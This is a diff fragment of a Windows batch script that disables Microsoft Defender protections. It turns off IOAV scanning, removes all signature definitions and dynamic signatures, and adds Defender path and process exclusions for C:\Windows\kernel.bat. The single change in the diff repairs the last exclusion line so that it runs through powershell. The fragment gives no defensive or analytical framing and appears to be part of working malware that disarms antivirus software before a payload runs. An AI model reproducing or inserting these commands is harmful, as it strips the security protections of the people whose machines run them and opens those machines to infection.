@@ -7,4 +7,4 @@ powershell -command Set-MpPreference -DisableIOAVProtection $true
 MpCmdRun -RemoveDefinitions -All
 MpCmdRun -RemoveDefinitions -DynamicSignatures
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\kernel.bat"
-Add-MpPreference -ExclusionProcess "C:\Windows\kernel.bat 
+powershell Add-MpPreference -ExclusionProcess "C:\Windows\kernel.bat 
